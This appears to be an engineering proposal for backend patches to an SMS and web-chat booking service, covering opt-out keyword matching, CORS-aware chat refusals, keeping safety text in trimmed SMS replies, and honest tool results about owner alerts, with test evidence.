# Backend proposals: SMS keywords, chat 403s, SMS safety trim, truthful tool results, callback promise, CSV formulas, missed-call promise

Base: `dfb0ae7846e66871d849c67566bf9d3b475f46ae`. Backend owner: Codex.

**Status: proposed, not applied. Revision 2 addresses the independent QA notes in `qa/`.** None of the tracked files in this worktree were changed (`git status` shows only this untracked folder). Each patch was applied only to throwaway copies outside the worktree, and all tests ran there. All seven patches apply cleanly to dfb0ae78 (`git apply --check`), each on its own or all together, in either order. Applying them in the order 01→07 and in the order 07→01 gives byte-identical trees.

Shared files:
- `02` and `04` both touch `chat.mjs`.
- `03` and `04` both touch `sms-agent-background.mjs`.
- `04` and `05` both touch `lib/config.mjs`.
- `06` touches only `client.mjs` and a new `lib/spreadsheet-cell.mjs`, and `07` only `voice.mjs`.

None of their hunks overlap.

**Round 3 (proposals 3 to 5)** comes from the AI conversations review, findings R1 to R3 (`/tmp/mc-claude-ai-conversations-review-20261110/qa-artifacts/claude-collaboration/ai-conversations-review/REVIEW.md`).

**Round 4 (proposals 6 and 7)** comes from the coverage-map blind spots D1 to D3 (`/tmp/mc-claude-coverage-map-20261110/qa-artifacts/claude-collaboration/blind-spot-checks/`).

Everything ran offline: memory store or an in-process Blobs double, `MC_FAKE_MODEL=1`, provider env removed, and outbound networking denied. The only network access was reading the CTIA PDF. Browser runs used the bundled `chrome-headless-shell-1223`.

| File | What it is |
|---|---|
| `01-stop-keywords.patch` | Proposal 1: new `lib/sms-keywords.mjs`, plus changes to `lib/platform-sms.mjs` and `lib/managed-consent.mjs` |
| `02-chat-403.patch` | Proposal 2: changes to `chat.mjs` |
| `stop-keywords-check.mjs` | Proposal 1 acceptance check (91 cases) |
| `chat-403-check.mjs` | Proposal 2 acceptance check (28 checks) |
| `widget-stream-403-real.mjs` + `.diff` | Refreshed widget-stream suite, fed the real 403 bodies from the handler |
| `widget-403-cors-probe.mjs` | Real cross-origin browser probe: two loopback origins, with the real handler behind `/api/chat` |
| `03-sms-trim-safety.patch` | Proposal 3: `sms-agent-background.mjs` |
| `04-tool-result-truth.patch` | Proposal 4: `lib/send.mjs`, `lib/desk.mjs`, `chat.mjs`, `sms-agent-background.mjs`, `vapi.mjs`, and one prompt line in `lib/config.mjs` |
| `05-callback-promise.patch` | Proposal 5: `lib/config.mjs`, `lib/vapi.mjs` |
| `sms-trim-safety-check.mjs` | Proposal 3 acceptance check (40 cases, real SMS agent handler) |
| `tool-result-truth-check.mjs` | Proposal 4 acceptance check (39 checks, real chat, SMS-agent and Vapi handlers) |
| `callback-promise-check.mjs` | Proposal 5 acceptance check (23 assembled prompts) |
| `06-csv-formula-guard.patch` | Proposal 6: new `lib/spreadsheet-cell.mjs`, plus `client.mjs` |
| `07-missed-call-promise.patch` | Proposal 7: `voice.mjs` |
| `csv-injection-check.mjs` | Proposal 6 acceptance check (4 real CSV exports) |
| `missed-call-promise-check.mjs` | Proposal 7 acceptance check (10 checks, real `/api/voice`) |
| `receipts/` | Logs and JSON for every run cited below |

---

## Proposal 1: STOP/opt-out keyword normalization (CTIA 5.1.3)

**Revision 2.** Independent QA (`qa/`) accepted the proposal with notes. This revision makes QA's required change and adds the recommended additions:
- QUIT is now whole-message only.
- The courtesy list is stricter.
- New whole-message phrases.
- CANCELAR and BAJA.
- Signature stripping.
- The campaign keyword list.
- QA's 104 cases are now part of the check.

### Problem
At dfb0ae78, a keyword is recognized only when the whole message is exactly that word:
- `lib/platform-sms.mjs:35-41`. Line 36 is `const word = body.trim().toUpperCase();`, and the result is checked with `includes()` against the lists at `:7-10`.
- `lib/managed-consent.mjs:7-9` uses anchored regexes, applied at `:32`. The shop list also lacks REVOKE and OPTOUT (AUDIT.md gap G3).

As a result, "Stop.", "STOP!", "Stop please", "¡Alto!" and "please opt me out" are not opt-outs.

CTIA Messaging Principles, May 2023, §5.1.3. I re-extracted this from the PDF with PDFKit, because the local text dump had dropped the sentence:
> "Standardized "STOP" wording should be used for opt-out instructions, however opt-out requests with normal language (i.e., stop, end, unsubscribe, cancel, quit, "please opt me out") should also be read and acted upon by a Message Sender except where a specific word can result in unintentional opt-out. The validity of a Consumer opt-out should not be impacted by any de minimis variances in the Consumer opt-out response, such as capitalization, punctuation, or any letter-case sensitivities."

### Change (`01-stop-keywords.patch`)
- **New `lib/sms-keywords.mjs`.**
  - It defines `SMS_KEYWORDS`, which is the same published lists as before:
    - stop: STOP, STOPALL, UNSUBSCRIBE, CANCEL, END, QUIT, REVOKE, OPTOUT, ALTO, PARAR
    - start: START, UNSTOP, EMPEZAR
    - help: HELP, INFO, AYUDA
  - It adds `normalizeSMSKeywordText()` and `classifySMSKeyword()`.
- **`platform-sms.mjs`.** `PLATFORM_SMS_KEYWORDS` is now `SMS_KEYWORDS`, with the same value, so `platform-sms-check.mjs:40` and `sms-policy-check.mjs:107` still deep-equal. `keyword()` now uses the classifier. Twilio `OptOutType` is unchanged.
- **`managed-consent.mjs`.** The three regexes are replaced by the shared classifier, so the shop line uses the same vocabulary as the platform line (REVOKE and OPTOUT are added). Precedence `stop > start > help` and the `providerOptOutType` handling are unchanged.
- **`messaging-provider.mjs:47`.** The tiny optional change QA offered is **included**. The A2P campaign `OptOutKeywords` gains REVOKE and OPTOUT, so the Twilio registration matches the platform list and the public pages. This affects only campaigns registered or re-registered after the change; existing Twilio campaigns keep their current list. `messaging-activation-check` still passes (its check at line 59 is `includes("PARAR")`).

### Rule
1. **Normalize the text.**
   - Drop trailing lines that look like a signature ("Sent from my iPhone/Android/…", "Sent from Yahoo/Outlook/Gmail…", "Get Outlook for …", "Enviado desde mi …").
   - Apply NFKD and remove accents. Uppercase.
   - Turn every character that is not a letter, digit or in-word apostrophe into a space; this removes punctuation, emoji and zero-width characters.
   - Collapse spaces.
   - Join `OPT [ME] OUT` into `OPTOUT` and `STOP ALL` into `STOPALL`.
   - If the message is only single letters, join them ("S.T.O.P." becomes STOP).
2. **Whole-message keyword.**
   - The normalized message equals one published STOP, START or HELP keyword, or one of the Spanish extras **CANCELAR** or **BAJA**.
   - CANCELAR and BAJA are recognized but not added to the published list, so the campaign and public-page keyword checks stay exact.
   - **CANCEL, END, QUIT, REVOKE and CANCELAR count only as the whole message.** So "It quit", "quit working", "cancel my appointment" and "end of the day works" stay conversations.
3. **Whole-message opt-out phrases.** The phrase may start with PLEASE and may end with courtesy words (PLEASE, NOW, THANKS, THANK YOU, POR FAVOR, GRACIAS, YA) or AGAIN, ANYMORE or EVER. The phrases:
   - DONT/DON'T/DO NOT TEXT/MESSAGE/CONTACT ME
   - QUIT/STOP TEXTING/MESSAGING/CONTACTING ME
   - REMOVE ME/MY NUMBER [FROM YOUR/THE/THIS LIST]
   - TAKE ME/MY NUMBER OFF [YOUR/THE/THIS] LIST
   - UNSUBSCRIBE [ME] FROM YOUR/THE/THIS LIST
   - NO MORE TEXTS/MESSAGES
   - NO [QUIERO] MAS MENSAJES
   - NO ME ESCRIBAN/MANDEN/ENVIEN/TEXTEEN [MAS] [MENSAJES]
   - DEJEN DE ESCRIBIRME/ESCRIBIR/MANDARME MENSAJES/…
4. **Short polite opt-out.** A message is STOP when all of these hold:
   - it has at most 6 words;
   - it contains at least one *strong* word: STOP, STOPALL, UNSUBSCRIBE, OPTOUT, ALTO, PARAR or BAJA (not QUIT);
   - every other word is on the strict courtesy list: PLEASE, PLS, PLZ, NOW, JUST, ME, TEXT(S/ING), MESSAGE(S/ING), SEND(ING), CONTACTING, THANKS, THANK, YOU, THX, TY, OK, OKAY, WRONG, NUMBER, POR, FAVOR, YA, GRACIAS, MENSAJES, TEXTOS.

   **IT, THE, MY, ALL, THIS, THEM and MAS are deliberately not courtesy words.** So "stop it", "please stop it", "the stop", "my stop", "stop the texts", "Mas alto" and "stop all the dripping" stay conversations.
5. **START and HELP are whole-message only.** "help me" and "help, my pipe burst" are conversations.
6. **YES / SI / SÍ consent is unchanged and exact.** It grants recurring-message consent, so it should stay strict. It is also matched separately and exactly in `managed-sms.mjs:141-144`.

### Trade-offs
- **Remaining misses (accepted, 5 of QA's 65 opt-outs):**
  - "no more" is ambiguous on its own.
  - "Stop, I already booked" has extra content words.
  - "cancel all" could mean all appointments.
  - "stopp" and "Sto p" are misspellings, and I did no fuzzy matching.

  These and longer sentences such as "stop texting me i already booked" reach the normal conversation and the owner. Twilio Advanced Opt-Out (`OptOutType`) is still the second net.
- **New behavior on bare words.**
  - "Help!", "Info." and "Start." now get the HELP or START handling. Before, they were AI conversations on shop numbers and guidance replies on the platform line.
  - A bare "Stop!" or "Cancel." mid-conversation is an opt-out. CTIA requires this.
- **QUIT made exact-only** loses polite variants such as "quit it now". "Quit texting me" is still caught by its explicit phrase.
- **The shop line gains REVOKE, OPTOUT, CANCELAR and BAJA.** This only adds opt-outs, the safe direction.

### Gaps outside this patch (not changed)
- **Legacy `netlify/functions/sms.mjs:15-16`** has its own matcher, which is not aligned with this one.
  - It catches more free text: `STOP_PHRASE` matches "stop texting" *anywhere*, plus "remove me", "don't text" and Spanish phrases.
  - It misses others: fullwidth or zero-width STOP, "S.T.O.P.", emoji after STOP, BAJA.
  - Its substring phrases also give false opt-outs that this patch avoids. QA's probe shows legacy=stop for "remove me from the schedule" and "don't text, call me instead".
- **Legacy `sms.mjs:41-53`.** Owner commands (`:41-46`) and texts from VIP bypass numbers (`:48-53`) are handled **before** the STOP check at `:57`. So a STOP from the owner's phone or from a bypass-list number is never recorded as an opt-out.
- **`lib/send.mjs`.** `force:true` skips the opt-out check (`:43`). It is used for owner alerts at `:101`, and for welcome, test and number-assigned texts in `client.mjs:486,511,522,549` and `provision-background.mjs:77`. These texts reach the owner's phone even if that number has opted out.
- **`messaging-provider.mjs:47` OptOutKeywords** lacked REVOKE and OPTOUT. **This is now included in the patch**, as described above. Existing registered campaigns still need a re-registration or a Console update.

### Evidence
- **`stop-keywords-check.mjs`** has 224 cases: 120 of my own plus QA's 104, copied verbatim from `qa/qa-stop-cases.mjs`. Each case runs through the **real** `/api/platform-sms` handler (signed form, intercepted receipt GET, reading the keyword on the receipt) and the **real** `recordManagedInbound()`.
  - **Required:** all of my own cases, plus every QA row that expects anything other than STOP. That is 159 cases.
  - **Recall only:** QA's STOP rows.

  | | Base dfb0ae78 | Previous patch (QA's run) | **This revision** |
  |---|---|---|---|
  | Required cases failing | 61 of 159 (**FAIL**) | n/a | **0 of 159 (PASS)** |
  | QA 98 stop/not-stop rows, platform (tp/fn/fp/tn) | 16/49/0/33 | 45/20/4/29 | **60/5/0/33** |
  | Recall / precision, platform | 0.246 / 1.00 | 0.69 / 0.92 | **0.923 / 1.00** |
  | Recall / precision, shop line | 0.215 / 1.00 | same as platform | **0.923 / 1.00** (identical to platform) |

  Every false-positive guard passes on both lines, including:
  - "please stop by tomorrow", "can you stop the leak", "cancel my appointment", "quit working", "help, my pipe burst";
  - "It quit", "It just quit", "It quit now", "All quit", "quit it";
  - "Mas alto", "stop it", "the stop", "my stop".

  Receipts: `receipts/stop-keywords-{base,patched}.{log,json}`. Both runs made 0 requests other than the intercepted receipt read.
- **QA's probe script, rerun on the final patch** (`receipts/qa-classifier-probes-after.log`). The listed false opt-outs are gone. "S.T.O.P.", "dont text me", "cancelar" and the "Sent from my iPhone" case are now caught.
- **Patch check.** The patch was applied to a fresh copy of dfb0ae78 with `git apply`, and both checks passed there.
- **Regressions.** These scripts were run on base and on patched, and each exits 0 on both. Logs are in `receipts/p1-regress-{base,patched}/`.

  | Script | Result (base and patched) |
  |---|---|
  | platform-sms-check | 18/18 |
  | platform-sms-independent-check | pass |
  | sms-policy-check | 20/20 |
  | managed-sms-qa-check | pass |
  | managed-sms-budget-check | 14/14 |
  | launch-appointment-consent-qa-check | 5/5, sourceStable |
  | managed-delivery-qa-check | 18/18 |
  | messaging-activation-check | pass |
  | request-automation-check | 33/33 |
  | tenant-isolation-check | pass |
  | service-onboarding-qa-check | pass (added this round, because it imports managed-consent) |

### Risks
- These are behavior changes on live inbound SMS. Any word added to the courtesy or phrase lists later widens the rule, so reviewers should treat those lists as policy. The QA guards in the check protect them.
- The shared module creates one place that can break both lines. Both lines are exercised through their real handlers.
- The campaign keyword change applies only to new registrations.

---

## Proposal 2: chat 403 refusals on first sends

### Problem
In `chat.mjs` at dfb0ae78, these returns send only `{error}`, with no `message`, no `turnNotProcessed`, and, for most of them, **no CORS headers**:

| Line | Condition |
|---|---|
| `:63` | `GET ?mode=sales` from a non-site origin |
| `:87` | Owner token from a non-workspace origin (these already had CORS) |
| `:90` | Owner session for a different account (these already had CORS) |
| `:104` | Test channel without owner authority |
| `:108` | Self-service web chat not ready or paused |
| `:111` | Origin not allowed |
| `:112` | Shop not live, or paused |

The widget saves `pendingTurn` before it sends (`embed.js:164`) and clears it only when `turnNotProcessed === true` (`embed.js:170`). So after a 403 the composer stays locked behind "Check previous reply", with the false "interrupted" copy. This is REAL-1 in suite-refresh/REFRESH.md and the 403 section of combined-preview/refreshed-suites/RESULTS.md.

### Change
`02-chat-403.patch` adds `refused(origin, body, error, message)`, which returns `{ error, message, turnNotProcessed: body?.recoverTurn !== true }` with status 403 and `cors(origin)`. All seven returns use it, and the `error` codes are unchanged.

| Line | `message` |
|---|---|
| `:108`, `:112` (customer widget on an allowed page) | "Website chat is unavailable right now. Please use the shop’s contact details on this website." |
| `:111` (page is not one of this shop's sites) | **Revision 2, per QA:** "Website chat is not available on this page. Please contact the shop directly." The page may not belong to the shop, so it must not point at "contact details on this website". The CORS origin echo is kept; QA judged it correct. |
| `:63` | "Chat is unavailable on this page." The request is a GET with no body, so the flag is `true` because there is no turn. |
| `:87` | "Workspace chat can only be opened from your Machines & Cloud workspace." |
| `:90` | "This sign-in does not have access to this workspace's chat." |
| `:104` | "The test line is only available to the workspace owner." |

**Why CORS is part of the fix:** the widget runs on the shop's own site, so it is cross-origin to the platform. The preflight at `:60` already reflects the origin, but the 403 bodies at `:104/:108/:111/:112` did not. The browser therefore blocks the body, `fetch` rejects, and embed.js shows "interrupted" whatever the body says. **Adding the flag alone would not reach a real cross-origin widget.** This is proven below.

### These returns happen before any conversation read or write
I checked this by reading the code and by an access log.
- **From the code (dfb0ae78).** Before these returns, the handler does only the following:
  - parse the body (`:73`);
  - `strictRead("clients")` (`:85`);
  - for `:90`, `getAccessSession` reads `access_sessions` (`:88`);
  - for legacy (non-self-service) tenants only, `rateLimited(ip)` reads and writes the `ratelimit` counter (`:95`). This happens before `:104`, `:111` and `:112`. It is an IP counter, not conversation, turn or allowance state.

  The first conversation access is `getConversation` at `:132`, followed by `beginConversationTurn` at `:136`. AI or sales allowance reservation and model calls come later still. `:63` returns before `getSalesAllowance`.
- **From the access log.** `chat-403-check.mjs`, in its `blobs-double` mode, records every storage access. For each of the 13 refusal cases, it asserts that no `conversations` key and no AI, sales or budget key was touched. A control send that the handler admits does show conversation traffic, so the log is meaningful.
- **Why recovery stays `false`.** A `recoverTurn` probe is refused before the server reads the conversation. The refusal therefore says nothing about the original turn, which may have been saved before an interrupted reply. So the flag is `false` on a recovery probe, as RESULTS.md recommends.

### Evidence
- **`chat-403-check.mjs`.** It calls the real handler in-process, with a fake model and no provider env. It covers all 7 lines, each as a first send and as a `recoverTurn` probe (`:63` is a GET and has only the first case), under two backends: `MC_MEMORY_STORE=1` and a logged Blobs double. It checks the status, the unchanged error code, the presence of `message` (and the exact `:111` copy), `turnNotProcessed === !recover`, that the CORS header echoes the origin, that the conversation is still empty (memory mode), and that there was no conversation or allowance access (double mode).
  - **Base: FAIL, 2/28.** Only the two control sends pass. Receipts: `receipts/chat-403-base.{log,json}`.
  - **Patched: PASS, 28/28.** Receipts: `receipts/chat-403-patched.{log,json}`.
  - The real 403 bodies captured from the handler are in `receipts/chat-403-real-bodies-{base,patched}.json`.
- **Refreshed widget-stream copy, unmodified** apart from the browser executable (`receipts/widget-stream-unmodified-env.diff`). Run against the patched copy, **it still fails `denied_request_recovers_composer`**, its last scenario, with a 2.5 s wait timeout (`receipts/widget-stream-unmodified-on-patched.log`). This is expected: its 403 is a hard-coded `{error:'fixture_denied'}` served by a mocked `window.fetch` (line 87), so it never calls the server. A server patch cannot change that outcome.
- **`widget-stream-403-real.mjs`**, with the diff in `widget-stream-403-real.diff`. It is the same suite and the same real `embed.js` (sha 43cc96c9…, unchanged), with these changes:
  - the 403 fixture body is the **real** handler body;
  - a 403 that carries a `message` must show that message, not the "couldn’t confirm" copy, and must clear `pendingTurn`;
  - it adds the recovery-403 case that REFRESH.md asked for.

  Results:
  - **Patched bodies: 26/26 pass.** The first-send 403 clears `pendingTurn`, re-enables the composer and shows the server message. On a recovery probe, the 403 keeps `pendingTurn` (same turnId) and keeps the composer held.
  - **Base bodies: 24/26.** `denied_request_recovers_composer` times out with the composer still locked. The recovery case fails only because no message is shown.
  - Receipts: `receipts/widget-403-real-{patched,base}{.log,/}`.
- **`widget-403-cors-probe.mjs`** runs a real cross-origin browser test: shop page and platform on two loopback ports, with the real `chat.mjs` (including its preflight) behind `/api/chat`. Receipts: `receipts/widget-403-cors-*`.
  - **Base:** the POST returns 403 without `Access-Control-Allow-Origin`. Chromium logs "blocked by CORS policy", the widget shows "interrupted", `pendingTurn` is kept and the composer is locked.
  - **Patched:** the 403 carries ACAO, the body is read, `pendingTurn` is cleared, the composer is released and the server message is shown.
  - **Control (patched body with the CORS headers removed):** the lock comes back. **The flag works only together with the CORS headers.**
- **Regressions.** Every chat script was run on base and on patched, and each one exits 0 on both. Logs are in `receipts/p2-regress-{base,patched}/`. The scripts: smoke, conversation-history-check, owner-test-check, customer-owner-test-check, self-service-ai-check, self-service-ai-proof-check (14/14), sales-desk-check, sales-budget-check, sales-agent-check, sales-desk-backend-qa-check, persona-check, tenant-isolation-check, website-installation-check (18/18), request-automation-check.
  - `customer-web-delivery-qa-check --output` stops with the **same pre-existing fatal on base and on patched** (`Cannot read properties of null (reading 'reservations')` at its line 57). This is not caused by the patch.
  - Not run: `demo-outcome-check`, a voice UI check that needs a local server and is unrelated; and the original `scripts/widget-stream-check.mjs`, which is stale per REFRESH.md (the refreshed copy is used instead).

### Does embed.js need a frontend change?
- **Not for the first-send lock.** `embed.js:170` already honours `turnNotProcessed` and already shows `error.message`. With this patch alone, a definite 403 on a first send releases the composer and shows honest copy, cross-origin included.
- **Yes, for the recovery-403 loop. That is a separate frontend item, not in this patch.** After an interrupted reply, if "Check previous reply" gets a 403, the patched server correctly answers `turnNotProcessed:false`. embed.js then correctly keeps `pendingTurn`. But `.recovery` stays visible (`recoveryStillOffered: true` in `receipts/widget-403-real-patched/website-stream-fixed.json`), so each click sends another 403 and adds another bubble.

  The exact change, as recommended in RESULTS.md: in `embed.js:170`, when `res.status === 403 && recover`, keep `pendingTurn`, hide or disable `.recover-reply`, show "Chat is unavailable right now; your earlier message may already be saved", and re-read `/api/client` so that a later resume restores the control.
- **Optional.** After a first-send 403 the composer is usable again. A visitor who retypes simply gets another definite 403 with the same message. Re-reading config to show the unavailable state is a UX nicety.

### Risks
- **CORS on refusals.** The handler now reflects any requesting origin on these 403s, including `:111` (an origin that is not allowed). That origin can read `{error:"forbidden", message, turnNotProcessed}` and nothing else. The OPTIONS preflight (`:60`) already reflects every origin, and `:87`, `:90` and the `401`/`503` paths already sent `cors(origin)`. No tenant data is added. Codex should confirm this is acceptable.
- **The invariant must hold.** "No 403 after admission" is what makes `turnNotProcessed:true` safe. If someone later moves a conversation, turn or allowance write above one of these returns, the flag becomes wrong. `chat-403-check.mjs` (double mode) is the guard, so it is worth adding to the build list.
- **`:63` is a GET.** The flag there means "no turn exists". It is harmless, but it can be dropped if Codex prefers.
- **Website-check path.** It ignores the flag (`!setupCheck` at `embed.js:170`) and is unaffected.

---

## Proposal 3: never drop safety text when trimming SMS replies

Source: AI conversations review, finding R1 (`/tmp/mc-claude-ai-conversations-review-20261110/qa-artifacts/claude-collaboration/ai-conversations-review/REVIEW.md`).

### Problem
`netlify/functions/sms-agent-background.mjs:37-38` takes the first sentence of the legacy SMS reply and deletes it when it starts with `have|need|got|book|call|now|phone filled|ok, i|ok, let|let me`, is under 12 words, and more than 10 characters follow. A reply that correctly puts the safety line first, such as "Call 911 and get everyone outside now. I saved your request…", is sent as "I saved your request…". The prompt orders exactly that shape: `lib/config.mjs:303` ("begin the customer-facing reply with the safety script") and `lib/agent.mjs:14` (`DELIVERY_CONTRACT`: "begin that final reply with the prescribed safety guidance").

### Why the trim exists
`git log -L37,38` shows that it came in with f9bbfb70 (2026-10-19, ticket S1-21 "SMS replies never carry the model's planning text"). 811e8caf only changed the `logEvent` argument. `product/SPRINT.md` (S1-11 verification) gives the reason: an SMS reply after booking began "Have name, address, issue, window. Phone filled automatically. Book." The main fix was `dropToolPreamble` in `runAgent`. This regex was added as a "last-resort first-sentence filter" for the same planning notes, with the word list taken from that one sample. `call` and `now` were meant for notes like "Call book_visit." and "Now book." They were never meant for customer instructions.

### Change (`03-sms-trim-safety.patch`, one file)
- The trim condition gains `&& !isSafetySentence(c, first)`. Everything else about the trim is unchanged, including the `reply_trimmed` event.
- `isSafetySentence` is added below the handler. A first sentence is never trimmed when:
  - it contains a life-safety word: 911, emergency, gas, leave, outside, evacuate, fire, smoke, carbon monoxide or monoxide, "get (everyone) out", "out of the house/home/building", `CO` (case-sensitive), or the Spanish emergencia, salga, salir, afuera, incendio, humo, monóxido; **or**
  - it quotes the shop's **configured safety script**. That is `rules.emergencies.script`, or the old string form, read the way `normalizeEmergencies` reads it, else the default script. The sentence counts as a quote when it is a 3-or-more-word span of the script, or when it contains a whole sentence of the script. Owner scripts carry no keyword guarantee, so this is what protects "Now walk away from the house and phone Atmos at 888-286-6700."
  - **Exception:** a sentence that names a tool (`book_visit`, `notify_owner`, `update_visit`, `get_availability`) is always planning and is still trimmed. Example: "Call notify_owner with urgency emergency."
- The helper reads the script inline, with no new import. This keeps the patch's hunks clear of the import lines that `04` edits, so `03` and `04` apply in either order.

### Rationale: why a guard and not a narrower regex
- **Narrowing the regex** (for example, dropping `call` and `now`) would still let "Need you to leave the area now." and "Have everyone step outside now." be trimmed. It would also stop trimming the planning notes S1-21 targets ("Now book.", "Call book_visit."), so it changes more behaviour while protecting less.
- **Deleting the trim** (the review's first suggestion) is defensible, because `dropToolPreamble` already withholds pre-tool text. But it reopens S1-21 for any planning text the model writes in its final turn.
- **The guard is the narrowest safe fix.** Its behaviour differs from base only when the sentence the base would drop is safety text. In that case the base was wrong.

### Evidence
`sms-trim-safety-check.mjs` runs the **real** `sms-agent-background.mjs` handler for each case (memory store, `ADMIN_KEY` header). The model is the `MC_FAKE_MODEL=1` seam, pointed by a loader hook at a stub that returns the case's reply. The check compares two things with the expectation: the body handed to `sendSMS` (the `[sms:disabled] … :: body` line) and the stored assistant turn. It makes no network calls.

There are 40 cases:
- **27 "keep" cases:**
  - 17 English emergency first sentences, including the review's R1 cases, "call the gas company", CO, carbon monoxide, fire, smoke and evacuate;
  - 3 owner-script cases (two configured scripts with no keyword);
  - 4 Spanish or mixed-language cases;
  - the default script;
  - 2 ordinary replies.
- **13 "trim" cases:**
  - the S1-21 planning notes ("Have name, address, issue, window.", "Phone filled automatically.", "Book it now.", "Need address…", "Got everything.", "OK, I'll book that.", "Let me check availability.", "Now call book_visit.");
  - a planning sentence that names a tool and contains "emergency";
  - planning first and safety second;
  - unrelated planning on shops with owner scripts;
  - **a control:** the owner-A sentence on a shop *without* that script is trimmed. This shows that the owner-script results come from the configuration, not from the word list.

Results:

| Copy | Result | Receipt |
|---|---|---|
| Base dfb0ae78 | **FAIL, 23 of 40.** Every failure is a safety sentence that was dropped. Examples: "Call 911 and get everyone outside now. I saved your request…" is sent as "I saved your request for Ray; what is the address?", and "Call Atmos at 888-286-6700 and stay off the property. We will follow up…" is sent as "We will follow up. What is the street address?". "Llame al 911…" survives on base only because it does not start with an English trigger word. | `receipts/sms-trim-safety-base.{log,json}` |
| `03` alone | **PASS, 40 of 40** | `receipts/sms-trim-safety-patched.{log,json}` |
| All five patches | **PASS, 40 of 40** | `receipts/sms-trim-safety-all-five.{log,json}` |
| All seven patches | **PASS, 40 of 40** | `receipts/sms-trim-safety-all-seven.{log,json}` |

### Risks
- **Fail-safe direction.** A planning note that happens to contain a safety word ("Need to leave a note for Ray.") is now sent instead of trimmed. That is a cosmetic leak, in the safe direction. The tool-name exception covers the common planning form.
- **The word list is policy.** Adding a word only widens the guard. "gas" also matches "gas furnace" and "gas water heater", so such a first sentence is now never trimmed.
- **This does not validate owner scripts** (review R5: an owner can configure a dangerous DIY script). It only stops the trim from deleting whatever script is configured.

---

## Proposal 4: truthful tool results about notifications

Source: review finding R2.

### Problem
On legacy tenants, the tool result handed to the model claims an alert or text that may never have gone out:

| Line | Tool result text at dfb0ae78 |
|---|---|
| `chat.mjs:184` | "Booked. Ref X. Ray has the details and the customer will get a text reminder." |
| `chat.mjs:185` | "Ray has been texted. Ref X." |
| `sms-agent-background.mjs:23` | "Owner texted. Ref X." |
| `sms-agent-background.mjs:28` | "… The owner has been told." |
| `sms-agent-background.mjs:29` | "Cancel request sent to the owner …" |
| `vapi.mjs:65` | "… The owner has the details and the customer will get a text reminder." |
| `vapi.mjs:66` | "The owner has been texted, reference X." (also for spam) |

`notifyOwner` returns the per-channel results (`lib/send.mjs:99-104`), but every caller discards them. The callers are `lib/desk.mjs:315-317` (the booking confirmation text and the owner alert), `:416`, `:437`, `:653` and `:659`. Line 22 (`Booked. Ref X.`) made no claim, but got the same note for consistency.

### Sync or queued?
For legacy tenants, `sendSMS` and `sendEmail` are **synchronous, awaited provider POSTs** inside the tool call (`lib/send.mjs:65`, `:88`). Nothing is queued in our system. `ok:true` means Twilio accepted the message (HTTP 201, Twilio status "queued") or Resend accepted it. Delivery to the handset is not known at that point. The truthful wording is therefore "**accepted by the provider; delivery and reading are not confirmed**". It is neither "delivered" nor "queued". Self-service tenants do queue through `queueSavedDelivery`, but their tool-result strings are already honest and are **unchanged**.

### Change (`04-tool-result-truth.patch`)
- **`lib/send.mjs` `notifyOwner`** labels each result with `channel: "text"` or `"email"`. Its return value had no readers before.
- **`lib/desk.mjs`:**
  - A module-level `WeakMap` keeps the send outcome beside the record returned by `bookVisit`, `flagLead`, `rescheduleVisit` and `cancelRequest`. It is never saved with the record.
  - `flagLead` records `{merged:true}` when a repeat within 30 minutes changed nothing and so sent no alert.
  - A new exported helper, `deliveryNote(c, record)`, builds the sentence:
    - **At least one owner alert accepted:** "Ray was sent a text and an email with the details (accepted by the provider; delivery and reading are not confirmed)."
    - **None accepted, or nothing configured:** "It is saved, but Ray could not be alerted yet (the alert did not go out | no owner phone or email is on file). Do not tell the customer that Ray was texted, emailed or told, and do not promise a callback time; say it is saved for Ray to review."
    - **Merged repeat:** "This matched an open request from the last 30 minutes (ref X) and nothing changed, so no new alert was sent. Do not say a new text was sent."
    - **Booking confirmation text to the customer (web and voice only):** "…accepted for delivery, and reminder texts are scheduled." or "…was not sent. Do not promise a confirmation text or text reminders." A missing customer phone counts as not sent.
    - **No recorded outcome:** "Whether Ray was alerted is not confirmed." plus the same do-not-claim line.
- **Callers.** The **shape is unchanged**: `{content, event}` for chat and SMS, `{toolCallId, result}` for Vapi, and the same events and `[Done: …]` markers. Only the text changes:
  - chat: `Booked. Ref X. <note>` and `Request saved. Ref X. <note>`;
  - SMS: the same, plus `Moved ref X to D W. <note>` and `Cancel request saved for ref X; the visit stays until the owner confirms. <note>`;
  - Vapi: `Booked, reference X. <note>`, `Request saved, reference X. <note>`, and spam now reads "Noted as spam; the owner was not alerted."
- **`lib/config.mjs:294` (legacy consent line).** The prompt orders the model to say "You'll get appointment texts from {name}…" after every booking. The patch appends: "If the book_visit result says the confirmation text was not sent, skip that line and do not promise texts." Without this, the prompt would contradict the new tool result. SMS bookings never get that note, so on SMS the line is still said.

### Evidence
`tool-result-truth-check.mjs` calls the real handlers in-process:
- `chat.mjs` (legacy web, allowed origin);
- `sms-agent-background.mjs` (`notify_owner`, `book_visit`, and `update_visit` reschedule and cancel_request on the booking it just made);
- `vapi.mjs` (`tool-calls` message).

The model is the `MC_FAKE_MODEL=1` seam, pointed by a loader hook at a stub that calls one tool and records the `tool_result` it gets back. For Vapi, the check reads the `result` that is returned to Vapi. It uses the memory store and denies sockets. The check runs in two child processes, because `send.mjs` reads the provider env once:
- **"unconfigured":** empty env, so every send returns `disabled`. This is the review's evidence condition.
- **"provider":** offline placeholder Twilio and Resend values (no real keys), with an in-process fetch double for `api.twilio.com` and `api.resend.com` that accepts or refuses per case. Any other URL is refused and counted (0).

There are 39 checks:
- each send state (disabled; both refused; both accepted; text refused but email accepted) is run through every tool and channel above;
- a merged repeat lead;
- no owner contact on file;
- voice spam;
- the conditional consent line in the assembled prompt.

Each tool result is asserted against what the double actually saw. A "false claim" is a check where the tool result claims a text, email or alert that the provider did not accept, or that never ran.

| Copy | Result | Receipt |
|---|---|---|
| Base dfb0ae78 | **FAIL, 39 of 39**, of which **22 are false claims**: "Ray has been texted" with SMS and email disabled or refused, after a merged repeat that sent nothing, with no owner contact on file, and for voice spam. The other 17 fail only because the base text cannot say what really happened, for example "Owner texted" when only the email went through. | `receipts/tool-result-truth-base.{log,json}` |
| `04` alone | **PASS, 39 of 39**, 0 false claims, 0 other requests | `receipts/tool-result-truth-patched.{log,json}` |
| All five patches | **PASS, 39 of 39** | `receipts/tool-result-truth-all-five.{log,json}` |
| All seven patches | **PASS, 39 of 39** | `receipts/tool-result-truth-all-seven.{log,json}` |

### Risks
- **The tool-result text is longer.** With a real model, the "Do not tell the customer…" line is an instruction. The fake model cannot show that the real model obeys it.
- **Fewer reassurances when texting is not set up.** In a legacy shop with no Twilio or Resend configuration, the model will now say "saved for Ray to review" instead of "Ray has been texted". That is the point of the change, but the owner will see it.
